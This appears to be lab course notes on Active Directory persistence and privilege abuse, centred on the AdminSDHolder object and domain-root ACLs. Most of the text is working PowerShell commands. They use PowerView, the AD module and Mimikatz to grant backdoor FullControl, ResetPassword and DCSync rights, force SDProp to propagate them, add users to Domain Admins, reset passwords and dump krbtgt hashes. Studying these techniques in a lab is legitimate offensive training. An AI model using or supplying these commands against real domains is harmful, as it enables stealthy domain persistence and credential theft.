# AdminSDHolder

• Resides in the System container of a domain and used to control the permissions - using an ACL - for certain built-in privileged groups (called Protected Groups).

• Security Descriptor Propagator (SDPROP) runs every hour and compares the ACL of protected groups and members with the ACL of AdminSDHolder and any differences are overwritten on the object ACL. 

Protected Groups

![image](https://user-images.githubusercontent.com/40224197/211097368-f1f41fbf-0bf8-4cec-8dc9-1b78a5652393.png)

Well known abuse of some of the Protected Groups - All of the below can log on locally to DC:

![image](https://user-images.githubusercontent.com/40224197/211097492-4a7b001b-a2f5-4ac4-b1f3-1f15c0da3cc4.png)

• With DA privileges (Full Control/Write permissions) on the AdminSDHolder object, it can be used as a backdoor/persistence mechanism by adding a user with Full Permissions (or other interesting permissions) to the AdminSDHolder object.

• In 60 minutes (when SDPROP runs), the user will be added with Full Control to the AC of groups like Domain Admins without actually being a member of it.

#### Add FullControl permissions for a user to the AdminSDHolder using PowerView as DA:
```powershell
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName student1 -Rights All -Verbose
```

#### Using ActiveDirectory Module and Set-ADACL:
```powershell
Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -Principal student1 -Verbose
```

#### Other interesting permissions (ResetPassword, WriteMembers) for a user to the AdminSDHolder:
```powershell
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName student1 -Rights ResetPassword -Verbose

Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName student1 -Rights WriteMembers -Verbose
```

#### Run SDProp manually using Invoke-SDPropagator.ps1 from Tools directory:
```powershell
Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
```

#### For pre-Server 2008 machines:
```powershell
Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose
```

#### Check the Domain Admins permission - PowerView as normal user:
```powershell
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'student1'}
```

#### Using ActiveDirectory Module:
```powershell
(Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access | ?{$_.IdentityReference -match 'student1'}
```

#### Abusing FullControl using PowerView_dev:
```powershell
Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose
```

#### Using Active Directory Module:
```powershell
Add-ADGroupMember -Identity 'Domain Admins' -Members testda
```

#### Abusing ResetPassword using PowerView_dev:
```powershell
Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
```

#### Using Active Directory Module:
```powershell
Set-ADAccountPassword -Identity testda -NewPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
```

# Rights Abuse

• There are even more interesting ACLs which can be abused.

• For example, with DA privileges, the ACL for the domain root can be modified to provide useful rights like FullControl or the ability to run "DCSync".

#### Add FullControl rights:
```powershell
Add-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName student1 -Rights All -Verbose
```

#### Using Active Directory Module and Set-ADACL:
```powershell
Set-ADACL -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Principal student1 -Verbose
```

#### Add rights for DCSync:
```powershell
Add-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName student1 -Rights DCSync -Verbose
```

#### Using ActiveDirectory Module and Set-ADACL:
```powershell 
Set-ADACL -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Principal student1 -GUIDRight DCSync -Verbose
```

#### Execute DCSync:
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

# Learning Objective 12

• Check if studentx has Replication (DCSync) rights.

• If yes, execute the DCSync attack to pull hashes of the krbtgt user.

• If no, add the replication rights for the studentx and execute the DCSync attack to pull hashes of the krbtgt user.
